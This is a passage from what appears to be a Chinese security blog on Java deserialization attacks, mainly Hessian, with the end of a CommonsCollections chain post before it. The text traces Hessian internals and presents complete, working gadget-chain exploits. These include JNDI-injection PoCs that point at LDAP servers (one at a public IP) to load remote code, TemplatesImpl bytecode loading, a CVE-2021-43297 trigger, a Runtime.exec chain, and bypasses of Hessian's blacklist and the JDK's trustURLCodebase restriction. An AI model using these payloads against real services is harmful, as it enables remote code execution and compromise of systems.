//add的内容为对象templates,是为了满足compare方法中this.transformer(invokerTransformer)的transform方法的参数        priorityQueue.add(templates);        priorityQueue.add(templates);        Class c = transformingComparator.getClass();        Field transformerField = c.getDeclaredField(&quot;transformer&quot;);        transformerField.setAccessible(true);        transformerField.set(transformingComparator, invokerTransformer);//        serialize(priorityQueue);        unserialize(&quot;ser.bin&quot;);    &#125;    public static void serialize(Object obj) throws IOException &#123;        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        oos.writeObject(obj);    &#125;    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException &#123;        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));        Object obj = ois.readObject();        return obj;    &#125;&#125;

该链如下：

cc4&#x2F;cc2的前提
因为 CommonsCollections4 除 4.0 的其他版本去掉了 InvokerTransformer 不再继承 Serializable，导致无法序列化。同时 CommonsCollections 4的版本 TransformingComparator 继承了 Serializable接口，而CommonsCollections 3里是没有的。这个就提供了一个攻击的路径
jdk：jdk8u65CC：Commons-Collections 4.0

]]></content>
      <categories>
        <category>java反序列化</category>
      </categories>
  </entry>
  <entry>
    <title>java反序列化之Hessian</title>
    <url>/2025/03/19/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BHessian/</url>
    <content><![CDATA[引用Java反序列化之Hessian
Java安全之Hessian反序列化
Hessian协议Hessian是一个基于RPC的高性能二进制远程传输协议，官方对Java、Flash&#x2F;Flex、Python、C++、.NET C#等多种语言都进行了实现，并且Hessian一般通过Web Service提供服务。在Java中，Hessian的使用方法非常简单，它使用Java语言接口定义了远程对象，并通过序列化和反序列化将对象转为Hessian二进制格式进行传输
对于 Hessian2 协议，Java 的HashMap对象经过序列化后首位字节由M变为了H，对应 ascii 码 72，其他的区别不大
项目中加入依赖
&lt;dependency&gt;    &lt;groupId&gt;com.caucho&lt;/groupId&gt;    &lt;artifactId&gt;hessian&lt;/artifactId&gt;    &lt;version&gt;4.0.63&lt;/version&gt;&lt;/dependency&gt;

基础使用序列化public static String ser(Object object) throws Exception&#123;    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();    Hessian2Output hessian2Output = new Hessian2Output(byteArrayOutputStream);    // hessian2Output.getSerializerFactory().setAllowNonSerializable(true);    hessian2Output.writeObject(object);    hessian2Output.flushBuffer();    return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());&#125;

反序列化public static Object unser(String string) throws Exception&#123;    ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(Base64.getDecoder().decode(string));    Hessian2Input hessian2Input = new Hessian2Input(byteArrayInputStream);    return hessian2Input.readObject();&#125;

寻找之旅普通反序列化流程创建一个普通类
package org.example;public class Person &#123;    //Person类未实现Serializable接口    public String name;    public transient int age;	//age用transient修饰    private float weight;    public Person(String name,int age,float weight)&#123;        this.name = name;        this.age = age;        this.weight = weight;    &#125;    public String getName() &#123;        return name;    &#125;    public int getAge() &#123;        return age;    &#125;    public float getWeight() &#123;        return weight;    &#125;    @Override    public String toString() &#123;        return &quot;Person&#123;&quot; +                &quot;name=&#x27;&quot; + name + &#x27;\&#x27;&#x27; +                &quot;, age=&quot; + age +                &quot;, weight=&quot; + weight +                &#x27;&#125;&#x27;;    &#125;&#125;

测试
String s = ser(new Person(&quot;sherlock&quot;,21,67));Person person = (Person) unser(s);System.out.println(person);

运行之后报错如下

从报错信息很清楚地就可以看出来问题出在Person类没有实现Serializable接口，自己打断点跟踪可以发现原因是在于Hessian在序列化数据的时候还是会检查是否实现Serializable接口

但是在Hessian中，序列化的这个规则很容易被打破，在上图代码中存在一个变量_isAllowNonSerializable，在hessian中可以由下面的语句设置为true
hessian2Output.getSerializerFactory().setAllowNonSerializable(true);


改完之后我们再次运行，返回结果如下

可以看到被transient修饰的字段不会被序列化，反序列化的时候返回默认值
也就是说Hessian的反序列化理论上支持反序列化任何对象
ok，接下来我们开始跟进反序列化流程
我们跟进readObject方法，这里的buffer是待反序列化字节流，然后取标识位，用于判断是什么类型的对象

这里我们是自定义的类，所以走到了case ‘C’

跟进readObjectDefinition，通过readString()方法获取到类名，readInt()方法获取到未被transient修饰的字段数，findSerializerFactory()方法获取到默认的工厂类SerializerFactory

接下来是通过工厂类来获取反序列化器，我们跟进去
一路步入到如下所示

往下走，会从一个表_staticTypeMap中获取基础类型的反序列化器，我们这是自定义的类，所以自然是没有的

继续往下走该处，跟进去

跟进load方法

诶，这似乎是对反序列化的类进行一定的判断，跟进isAllow方法

白名单为空，所以核验类是否在黑名单中

都没有，最后返回true，进入if内容中进行一个类加载，返回

跟进getDeserializer方法

再跟进loadDeserializer方法，一直往下走，跟进getDefaultDeserializer方法

我们可以发现最后获取的反序列化器是UnsafeDeserializer

跟进去看看，可以发现在UnsafeDeserializer类的静态代码块中进行了unsafe对象的加载

回到它的构造函数中，有一个getFieldMap方法对类进行一个对应field的获取
跟进去简单看一下，看到了对transient和static属性的处理，直接跳过不处理，这也是为什么前面观察到age属性无法被反序列化

获取到的field会被存入一个hashmap里

全部获取完返回后下一行代码就是对readResolve方法进行一个处理，跟原生反序列化一样，我们跟进去看看

该函数逻辑很简单，就是遍历所有的方法，如果存在readResolve方法就方法它，不存在就返回null

我们并没有重写readResolve方法，返回null，一路返回，最后是获取到的反序列化器便是UnsafeDeseializer

继续返回，还会将获取到的反序列化器put进_cachedDeserializerMap表中

然后继续返回，还会put进_cachedTypeDeserializerMap中

最后返回到readObjectDefinition方法，reader便被赋为了UnsafeDeseializer

往下走，会通过readString()方法来获取field的名字，然后丢进fields和fieldNames数组中

继续往下，这里便是对前面重要内容进行一个封装，然后add到_classDefs类定义中


然后我们就步出了readObjectDefinition方法，方法如其名就是获取类的各种属性、反序列化器等并将其进行封装或put
接着我们跟进readObject方法

走到这部分，会从_classDefs中获取到我们封装的重要内容，再跟进readObjectInstance方法

上面部分就是会获取类的各种属性、反序列化器等等，然后我们跟进readObject函数中（可以看到时通过unsafeDeserializer进行的反序列化）


通过instantiate()方法会获取到一个空的Person对象，然后再跟进readObject方法

这两步结束后，就完成了对对象的赋值，反序列化进程结束
漏洞点上面的流程跟完了之后，感觉并没有像fastjson,jacskon那样在反序列化过程中有调用到任何的getter和setter，全部都是用过unsafe进行的操作
那漏洞点在哪里呢？
答案就在于Hessian对于Map的反序列化过程中，会将反序列化过后的键值对put进map中
hashCode()创建一个HashMap对象并进行调试
跟进readObject后，会走到case ‘H’处

跟进readMap方法

我们可以看到当type为null，获取不到反序列化器时，会新生成一个_type值为HashMap的MapDeserializer对象
跟进它的readMap方法

如果_type为null则会自动给map赋为HashMap；如果它是Map类，则也会被当作HashMap；如果它是StoredMap类，则是被当作TreeMap进行反序列化
_type不为以上三种则直接生成对象
然后开始将键值对分别反序列化后存入map中

熟悉的put方法，之前我们都有跟过在HashMap调用put方法的时候，为了检测key值的唯一性，会先调用hash(key)，进而调用key.hashCode()


所以很明显了，我们可以在HashMap的key处做文章，将hashCode方法作为入口点
equals()在putVal方法里面，还会调用key的equals方法

compareTo()&#x2F;compare()对于TreeMap，为了检验key值
改一个自定义的Comparable
TreeMap&lt;Object,Object&gt; treeMap = new TreeMap&lt;&gt;();treeMap.put(new Comparable() &#123;    @Override    public int compareTo(Object o) &#123;        return 0;    &#125;&#125;, null);String treeMapStr = ser(treeMap);unser(treeMapStr);

进行调试，跟进readObject，走到case ‘M’
先是通过readType()获取到type值，然后再调用readMap方法

跟进去，然后走到MapDeserializer的readMap()处

继续跟进去

跟我们第一个分析的HashMap大差不差，差别比较大的就是TreeMap的put方法，这里我们跟进去

跟进第一个compare方法

comparator默认为null，所以会对k1调用了compareTo()，如果comparator（反射可赋值）不为null，还能调用comparator的compare()方法
因此我们就自然而然地走到了我们自己重写的compareTo方法

gadgetRome正好呢前段时间刚学完Rome反序列化，这里我们也正好可以用上
实际上一整条链子和yso的几乎没什么区别
JdbcRowSetImpl.getDatabaseMetaData()Method.invoke(Object, Object...)ToStringBean.toString(String)ToStringBean.toString()ObjectBean.toString()EqualsBean.beanHashCode()HashMap.hash()HashMap.put()MapDeserializer.readMap()SerializerFactory.readMap()Hessian2Input.readObject()

poc如下：
package org.example;import com.caucho.hessian.io.Hessian2Input;import com.caucho.hessian.io.Hessian2Output;import com.sun.rowset.JdbcRowSetImpl;import com.sun.syndication.feed.impl.EqualsBean;import com.sun.syndication.feed.impl.ToStringBean;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.lang.reflect.Field;import java.util.Base64;import java.util.HashMap;public class Test &#123;    public static void main(String[] args) throws Exception &#123;        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();        String url = &quot;ldap://47.113.102.46:50389/53bee6&quot;;        jdbcRowSet.setDataSourceName(url);        ToStringBean toStringBean = new ToStringBean(JdbcRowSetImpl.class,jdbcRowSet);        EqualsBean equalsBean = new EqualsBean(ToStringBean.class,toStringBean);        HashMap&lt;Object,Object&gt; hashMap = new HashMap&lt;&gt;();        hashMap.put(&quot;aaa&quot;, &quot;123&quot;);        Field tableField = HashMap.class.getDeclaredField(&quot;table&quot;);        tableField.setAccessible(true);        Object[] table = (Object[]) tableField.get(hashMap);        for (Object entry: table)&#123;            if (entry != null)&#123;                setField(entry,&quot;key&quot;,equalsBean);            &#125;        &#125;        String s = ser(hashMap);        unser(s);    &#125;    public static void setField(Object object,String fieldName,Object value) throws Exception&#123;        Class&lt;?&gt; c = object.getClass();        Field field = c.getDeclaredField(fieldName);        field.setAccessible(true);        field.set(object,value);    &#125;    public static String ser(Object object) throws Exception&#123;        ByteArrayOutputStream byteArrayOutputStream= new ByteArrayOutputStream();        Hessian2Output hessian2Output = new Hessian2Output(byteArrayOutputStream);        hessian2Output.getSerializerFactory().setAllowNonSerializable(true);        hessian2Output.writeObject(object);        hessian2Output.flushBuffer();        return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());    &#125;    public static Object unser(String string) throws Exception&#123;        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(Base64.getDecoder().decode(string));        Hessian2Input hessian2Input = new Hessian2Input(byteArrayInputStream);        return hessian2Input.readObject();    &#125;&#125;

有个小问题就是相比于yso的rome链，这里没办法使用TemplatesImpl，一开始没有报错也不清楚问题出在哪
摸索了一番之后猜测原因在于_tfactory属性是transient的，在原生反序列化中通过重写readObject()来给其赋值，但是在hessian中对于transient的属性是没办法反序列化的，并且只能在readResolve()中可能还原
二次反序列化利用java.security.SignedObject下的getObject()方法实现原生反序列化

在使用Java原生的反序列化时，如果被反序列化的类重写了readObject()，那么Java就会通过反射来调用重写的readObject()
下面我们来看TemplatesImpl类的readObject()方法
private void  readObject(ObjectInputStream is)      throws IOException, ClassNotFoundException    &#123;        SecurityManager security = System.getSecurityManager();        if (security != null)&#123;            String temp = SecuritySupport.getSystemProperty(DESERIALIZE_TRANSLET);            if (temp == null || !(temp.length()==0 || temp.equalsIgnoreCase(&quot;true&quot;))) &#123;                ErrorMsg err = new ErrorMsg(ErrorMsg.DESERIALIZE_TRANSLET_ERR);                throw new UnsupportedOperationException(err.toString());            &#125;        &#125;         // We have to read serialized fields first.        ObjectInputStream.GetField gf = is.readFields();        _name = (String)gf.get(&quot;_name&quot;, null);        _bytecodes = (byte[][])gf.get(&quot;_bytecodes&quot;, null);        _class = (Class[])gf.get(&quot;_class&quot;, null);        _transletIndex = gf.get(&quot;_transletIndex&quot;, -1);         _outputProperties = (Properties)gf.get(&quot;_outputProperties&quot;, null);        _indentNumber = gf.get(&quot;_indentNumber&quot;, 0);         if (is.readBoolean()) &#123;            _uriResolver = (URIResolver) is.readObject();        &#125;         _tfactory = new TransformerFactoryImpl();    &#125;

可以看到这里手动new了一个TransformerFactoryImpl类赋值给_tfactory，这样就解决了_tfactory无法被序列化的情况
所以这里我们就可以配合SignedObject类来实现，在SignedObject类的构造函数能够序列化一个类并且将其存储到属性content中
package org.example;import com.caucho.hessian.io.Hessian2Input;import com.caucho.hessian.io.Hessian2Output;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import com.sun.rowset.JdbcRowSetImpl;import com.sun.syndication.feed.impl.EqualsBean;import com.sun.syndication.feed.impl.ToStringBean;import javax.management.BadAttributeValueExpException;import javax.xml.transform.Templates;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.security.*;import java.util.Base64;import java.util.HashMap;public class Test &#123;    public static void main(String[] args) throws Exception &#123;        TemplatesImpl templatesimpl = new TemplatesImpl();        byte[] bytecodes = Files.readAllBytes(Paths.get(&quot;E:\\mycode\\tmp\\Test.class&quot;));        setField(templatesimpl,&quot;_name&quot;,&quot;aaa&quot;);        setField(templatesimpl,&quot;_bytecodes&quot;,new byte[][] &#123;bytecodes&#125;);        setField(templatesimpl, &quot;_tfactory&quot;, new TransformerFactoryImpl());        ToStringBean toStringBean = new ToStringBean(Templates.class,templatesimpl);        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(123);        setField(badAttributeValueExpException,&quot;val&quot;,toStringBean);        KeyPairGenerator keyPairGenerator;        keyPairGenerator = KeyPairGenerator.getInstance(&quot;DSA&quot;);        keyPairGenerator.initialize(1024);        KeyPair keyPair = keyPairGenerator.genKeyPair();        PrivateKey privateKey = keyPair.getPrivate();        Signature signingEngine = Signature.getInstance(&quot;DSA&quot;);        SignedObject signedObject = new SignedObject(badAttributeValueExpException,privateKey,signingEngine);        ToStringBean toStringBean1 = new ToStringBean(SignedObject.class, signedObject);        EqualsBean equalsBean = new EqualsBean(ToStringBean.class,toStringBean1);        HashMap&lt;Object,Object&gt; hashMap = new HashMap&lt;&gt;();        hashMap.put(&quot;aaa&quot;, &quot;123&quot;);        Field tableField = HashMap.class.getDeclaredField(&quot;table&quot;);        tableField.setAccessible(true);        Object[] table = (Object[]) tableField.get(hashMap);        for (Object entry: table)&#123;            if (entry != null)&#123;                setField(entry,&quot;key&quot;,equalsBean);            &#125;        &#125;        String s = ser(hashMap);        unser(s);    &#125;    public static void setField(Object object,String fieldName,Object value) throws Exception&#123;        Class&lt;?&gt; c = object.getClass();        Field field = c.getDeclaredField(fieldName);        field.setAccessible(true);        field.set(object,value);    &#125;    public static String ser(Object object) throws Exception&#123;        ByteArrayOutputStream byteArrayOutputStream= new ByteArrayOutputStream();        Hessian2Output hessian2Output = new Hessian2Output(byteArrayOutputStream);        hessian2Output.getSerializerFactory().setAllowNonSerializable(true);        hessian2Output.writeObject(object);        hessian2Output.flushBuffer();        return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());    &#125;    public static Object unser(String string) throws Exception&#123;        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(Base64.getDecoder().decode(string));        Hessian2Input hessian2Input = new Hessian2Input(byteArrayInputStream);        return hessian2Input.readObject();    &#125;&#125;

Resin导入依赖
&lt;dependency&gt;    &lt;groupId&gt;com.caucho&lt;/groupId&gt;    &lt;artifactId&gt;resin&lt;/artifactId&gt;    &lt;version&gt;4.0.63&lt;/version&gt;&lt;/dependency&gt;

Apache Dubbo Hessian2 异常处理时反序列化（CVE-2021-43297）在Hissian2Input#expect()方法下，存在这么几点需要注意的
1、Input序列化流的offset在这个过程中自减1
2、offset自减1后，调用readObject()进行反序列化
3、将obj和字符串进行拼接，将调用obj的toString()方法
toString()能够大大延伸利用链

查找用法，除了readObject()之外几乎所有read**()方法都有调用

查找用法走到readString()方法，读取一个字节流，经过判断是否为一些基本类型之后，若都不是，则走进default来执行expect()抛出异常
public String readString()  throws IOException&#123;  int tag = read();  switch (tag) &#123;  case &#x27;N&#x27;:    return null;  case &#x27;T&#x27;:    return &quot;true&quot;;......  default:    throw expect(&quot;string&quot;, tag);  &#125;&#125;

在上面跟踪反序列化流程的时候，提到过在readObjectDefinition()中获取类类型的时候第一步就会调用readString()方法来获取对象的type
在readObject()中，当第一个字节为大写’C’，对应ascii为67

前面我们提到，hessian是通过byte每一部分的第一个字符即tag作为标识符来判断后续一部分字节流对应的类型
前面使用hashmap的时候Byte的第一位为72，即’H’，会走到hashmap的反序列化流程
重要的是，这一部分字节流都是我们可控的
接下来就是如何让tag为67了，可以重写 writeString 指定第一次 read 的 tag 为 67, 还可以给序列化得到的bytes数组前加一个67
Poc
package org.example;import com.caucho.hessian.io.Hessian2Input;import com.caucho.hessian.io.Hessian2Output;import com.sun.rowset.JdbcRowSetImpl;import com.sun.syndication.feed.impl.ToStringBean;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.lang.reflect.Field;import java.util.Base64;public class Test &#123;    public static void main(String[] args) throws Exception &#123;        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();        String url = &quot;ldap://47.113.102.46:50389/c8ad0f&quot;;        jdbcRowSet.setDataSourceName(url);        ToStringBean bean = new ToStringBean(JdbcRowSetImpl.class, jdbcRowSet);        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();        Hessian2Output hessian2Output = new Hessian2Output(byteArrayOutputStream);        hessian2Output.writeObject(bean);        hessian2Output.close();        byte[] data = byteArrayOutputStream.toByteArray();        byte[] poc = new byte[data.length + 1];        System.arraycopy(new byte[]&#123;67&#125;, 0, poc, 0, 1);        System.arraycopy(data, 0, poc, 1, data.length);        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(poc);        Hessian2Input hessian2Input = new Hessian2Input(byteArrayInputStream);        System.out.println(hessian2Input.readObject());        hessian2Input.close();    &#125;&#125;

Hessian-jdk原生链Runtime入口点在javax.activation.MimeTypeParameterList的toString()，调用了parameters的get方法，而这里的parameters方法是一个HashTable

查一下HashTable的子类，看看哪个是有get方法的
结果只有UIDefaults有get()方法，并在其中调用了getFromHashtable()，传入的key可控

在getFromHashtable()中，value从hashtable中通过key获取，LazyVlue是一个接口，若value是LazyValue的子类，调用value的createValue()方法


依次找一找LazyValue实现类的createValue()
在LazyPainter下的createValue()中有类加载和类实例化，前面讲到CC链的时候提到TrAXFilter的构造器下调用了Templates的newTransformer()方法实现攻击
但是定睛一看，1332行指定了构造器的参数，和我们想要的的TrAXFilter完全不同，走不通，继续看看

还有一个实现类SwingLazyValue，看看它的createValue()方法

从该方法的具体内容中我们可以知道这里只能调用任意的静态方法，不能够调用实例方法
但是嘞，下面通过构造函数任意实例化对象到倒是了我们如何利用TrAXFilter提供了一个思路
看一下SwingLazyValue的构造函数

回顾一下利用流程：
javax.activation.MimeTypeParameterList.toString()	javax.swing.UIDefaults.get(Object)		javax.swing.UIDefaults.getFromHashtable(Object)			SwingLazyValue.createValue(UIDefaults)

初步构造一下
Object[] arg = new Object[]&#123;getTemplates()&#125;;MimeTypeParameterList mimeTypeParameterList = createObjWithoutConstructor(MimeTypeParameterList.class);UIDefaults defaults = new UIDefaults();SwingLazyValue swingLazyValue = new SwingLazyValue(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&quot;,null,arg);defaults.put(&quot;666&quot;,swingLazyValue);setField(mimeTypeParameterList,&quot;parameters&quot;,defaults);System.out.println(mimeTypeParameterList);

但是是能走到createValue()中的，当步过获取构造函数的一行的时候抛出异常

观察className等均没问题，感觉问题是出在getClassArray()的返回值，跟进去看看，最后通过getClass()来获取TemplatesImpl的class的

但是我们去看看TrAXFilter的构造函数，参数是接口Templates而并非TemplatesImpl，所以在getConstructor()的时候会出错

目前不知如何解决，所以转换一下思路，看看静态方法调用如何能够如何利用
MethodUtil的invoke方法可以调用任意对象的方法（这里指的是该类中的static的invoke方法）

直接使用的话方法如下
MethodUtil.invoke(Runtime.class.getDeclaredMethod(&quot;exec&quot;, String.class),Runtime.getRuntime(),new Object[]&#123;&quot;calc&quot;&#125;);

但是如果在SwingLazyValue()构造函数中传
很容易发现，Runtime.getRuntime()在进入SwingLazyValue.createValue()之后会获取其类Runtime.class
SwingLazyValue swingLazyValue = new SwingLazyValue(&quot;sun.reflect.misc.MethodUtil&quot;,&quot;invoke&quot;,new Object[]&#123;Runtime.class.getDeclaredMethod(&quot;exec&quot;, String[].class),Runtime.getRuntime(),new Object[]&#123;&quot;calc&quot;&#125;&#125;);

但是MethodUtil.invoke()的第二个参数是Object而不是Runtime，因此Method会获取失败

所以这里要做一个简单的变通，二次调用MethodUtil.invoke()，因为MethodUtil.invoke()是静态方法，所以二次调用中第二个参数可以是任意的值
为了符合SwingLazyValue.createValue()中获取Method的type，我们让它是Object对象
Method invokeMethod = MethodUtil.class.getMethod(&quot;invoke&quot;, Method.class, Object.class, Object[].class);Method execMethod = Runtime.class.getDeclaredMethod(&quot;exec&quot;, String.class);MethodUtil.invoke(invokeMethod,new Object(),new Object[]&#123;execMethod,Runtime.getRuntime(),new Object[]&#123;&quot;calc&quot;&#125;&#125;);

正向构造一下poc并用println()触发toString()：
        Method invokeMethod = MethodUtil.class.getMethod(&quot;invoke&quot;, Method.class, Object.class, Object[].class);        Method execMethod = Runtime.class.getDeclaredMethod(&quot;exec&quot;, String.class);//        MethodUtil.invoke(invokeMethod,new Object(),new Object[]&#123;execMethod,Runtime.getRuntime(),new Object[]&#123;&quot;calc&quot;&#125;&#125;);        MimeTypeParameterList mimeTypeParameterList = createObjWithoutConstructor(MimeTypeParameterList.class);        UIDefaults defaults = new UIDefaults();        SwingLazyValue swingLazyValue = new SwingLazyValue(&quot;sun.reflect.misc.MethodUtil&quot;,&quot;invoke&quot;,new Object[]&#123;invokeMethod,new Object(),new Object[]&#123;execMethod,Runtime.getRuntime(),new Object[]&#123;&quot;calc&quot;&#125;&#125;&#125;);        defaults.put(&quot;666&quot;,swingLazyValue);        setField(mimeTypeParameterList,&quot;parameters&quot;,defaults);        System.out.println(mimeTypeParameterList);

成功弹出计算器，接下来就是要思考反序列化过程中如何触发toString()方法了
很简单，利用上面刚刚学过的异常处理时反序列化，在序列化后的字节组前面再添加一个’67’就可以啦
Poc
package org.example;import com.caucho.hessian.io.Hessian2Input;import com.caucho.hessian.io.Hessian2Output;import sun.reflect.ReflectionFactory;import sun.reflect.misc.MethodUtil;import sun.swing.SwingLazyValue;import javax.activation.MimeTypeParameterList;import javax.swing.*;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.util.*;public class Test &#123;    public static void main(String[] args) throws Exception &#123;        Method invokeMethod = MethodUtil.class.getMethod(&quot;invoke&quot;, Method.class, Object.class, Object[].class);        Method execMethod = Runtime.class.getDeclaredMethod(&quot;exec&quot;, String.class);//        MethodUtil.invoke(invokeMethod,new Object(),new Object[]&#123;execMethod,Runtime.getRuntime(),new Object[]&#123;&quot;calc&quot;&#125;&#125;);        MimeTypeParameterList mimeTypeParameterList = createObjWithoutConstructor(MimeTypeParameterList.class);        UIDefaults defaults = new UIDefaults();        SwingLazyValue swingLazyValue = new SwingLazyValue(&quot;sun.reflect.misc.MethodUtil&quot;,&quot;invoke&quot;,new Object[]&#123;invokeMethod,new Object(),new Object[]&#123;execMethod,Runtime.getRuntime(),new Object[]&#123;&quot;calc&quot;&#125;&#125;&#125;);        defaults.put(&quot;666&quot;,swingLazyValue);        setField(mimeTypeParameterList,&quot;parameters&quot;,defaults);//        System.out.println(mimeTypeParameterList);        String s = ser(mimeTypeParameterList);        System.out.println(s);        unser(s);    &#125;    public static Object unser(String string) throws Exception&#123;        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(Base64.getDecoder().decode(string));        Hessian2Input hessian2Input = new Hessian2Input(byteArrayInputStream);        Object obj = hessian2Input.readObject();        return obj;    &#125;    public static String ser(Object object) throws Exception&#123;        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();        Hessian2Output hessian2Output = new Hessian2Output(byteArrayOutputStream);        hessian2Output.getSerializerFactory().setAllowNonSerializable(true);        byteArrayOutputStream.write(67);        hessian2Output.writeObject(object);        hessian2Output.flushBuffer();        return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());    &#125;    public static void setField(Object object,String fieldName,Object value) throws Exception&#123;        Class&lt;?&gt; c = object.getClass();        Field field = c.getDeclaredField(fieldName);        field.setAccessible(true);        field.set(object,value);    &#125;    public static &lt;T&gt; T createObjWithoutConstructor(Class&lt;T&gt; clazz) throws Exception&#123;        ReflectionFactory reflectionFactory = ReflectionFactory.getReflectionFactory();        Constructor&lt;Object&gt; constructor = Object.class.getDeclaredConstructor();        Constructor&lt;?&gt; constructor1 = reflectionFactory.newConstructorForSerialization(clazz,constructor);        constructor1.setAccessible(true);        return (T) constructor1.newInstance();    &#125;&#125;

用上述poc的话hessian版本需要在4.0.60以下
要是遇到一些奇怪的报错可看看该文章找个原因：https://blog.potatowo.top/2024/11/12/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BHessian
hessian高版本绕过hessian&gt;&#x3D;4.0.60
在上面分析反序列化过程中我们用的hessian版本就是大于4.0.60的，在这过程中有个函数isAllow()，在低版本里面只有一个白名单，并且其中还是空的，所以基本没什么用处
在高版本里面增加了一个黑名单的判断，并且是禁了Runtime的
但是JdbcRowSetImpl.getDatabaseMetaData()导致的jndi注入，并没有在黑名单中
        Method invokeMethod = MethodUtil.class.getMethod(&quot;invoke&quot;, Method.class, Object.class, Object[].class);//        Method execMethod = Runtime.class.getDeclaredMethod(&quot;exec&quot;, String.class);        Method jndiMethod = JdbcRowSetImpl.class.getMethod(&quot;getDatabaseMetaData&quot;);        Field field = BaseRowSet.class.getDeclaredField(&quot;dataSource&quot;);        field.setAccessible(true);        JdbcRowSetImpl jdbcRowSet = createObjWithoutConstructor(JdbcRowSetImpl.class);        field.set(jdbcRowSet,&quot;ldap://127.0.0.1:8085/evil&quot;);//        jdbcRowSet.getDatabaseMetaData();        MimeTypeParameterList mimeTypeParameterList = createObjWithoutConstructor(MimeTypeParameterList.class);        UIDefaults defaults = new UIDefaults();        SwingLazyValue swingLazyValue = new SwingLazyValue(&quot;sun.reflect.misc.MethodUtil&quot;,&quot;invoke&quot;,new Object[]&#123;invokeMethod,new Object(),new Object[]&#123;jndiMethod,jdbcRowSet,new Object[]&#123;&#125;&#125;&#125;);        defaults.put(&quot;666&quot;,swingLazyValue);        setField(mimeTypeParameterList,&quot;parameters&quot;,defaults);//        System.out.println(mimeTypeParameterList);        String s = ser(mimeTypeParameterList);        unser(s);

在jdk低版本，hessian高版本情况下成功弹窗
JNDI绕过jdk高版本trustURLCodebase限制在前面学习jndi注入的时候还要学到一种方法，就是利用System.setProperty()方法来修改系统变量，乍一看System好像在前面Hessian高版本的黑名单中，但是实际上序列化的并不是System对象，而是setProperty()方法的Method对象，所以在Hessian高版本依旧行得通
回到上面，观察javax.activation.MimeTypeParameterList的toString()的代码，很容易看出对UIDefaults进行键值对的遍历
因此能够在触发payload的value之前，put一个调用setProperty()方法的value
但是突然想到一个问题
调用setProperty()之后，第一个键值对完成了他的使命，java程序抛出了异常
所以程序无法继续执行下去，代码蛮写一下：
        Method invokeMethod = MethodUtil.class.getMethod(&quot;invoke&quot;, Method.class, Object.class, Object[].class);//        Method execMethod = Runtime.class.getDeclaredMethod(&quot;exec&quot;, String.class);        Method jndiMethod = JdbcRowSetImpl.class.getMethod(&quot;getDatabaseMetaData&quot;);        Method setPropertyMethod = System.class.getDeclaredMethod(&quot;setProperty&quot;, String.class, String.class);        MimeTypeParameterList mimeTypeParameterList0 = createObjWithoutConstructor(MimeTypeParameterList.class);        SwingLazyValue swingLazyValue0 = new SwingLazyValue(&quot;sun.reflect.misc.MethodUtil&quot;,&quot;invoke&quot;,new Object[]&#123;invokeMethod,new Object(),new Object[]&#123;setPropertyMethod,new Object(),new Object[]&#123;&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;,&quot;true&quot;&#125;&#125;&#125;);//        System.setProperty(&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;,&quot;true&quot;);        Field field = BaseRowSet.class.getDeclaredField(&quot;dataSource&quot;);        field.setAccessible(true);        JdbcRowSetImpl jdbcRowSet = createObjWithoutConstructor(JdbcRowSetImpl.class);        field.set(jdbcRowSet,&quot;ldap://127.0.0.1:8085/evil&quot;);//        jdbcRowSet.getDatabaseMetaData();        MimeTypeParameterList mimeTypeParameterList = createObjWithoutConstructor(MimeTypeParameterList.class);        UIDefaults defaults = new UIDefaults();        SwingLazyValue swingLazyValue = new SwingLazyValue(&quot;sun.reflect.misc.MethodUtil&quot;,&quot;invoke&quot;,new Object[]&#123;invokeMethod,new Object(),new Object[]&#123;jndiMethod,jdbcRowSet,new Object[]&#123;&#125;&#125;&#125;);        defaults.put(&quot;777&quot;,swingLazyValue0);        defaults.put(&quot;1&quot;,swingLazyValue);        setField(mimeTypeParameterList,&quot;parameters&quot;,defaults);//        System.out.println(mimeTypeParameterList);        String s = ser(mimeTypeParameterList);        unser(s);

若用try结构也能触发
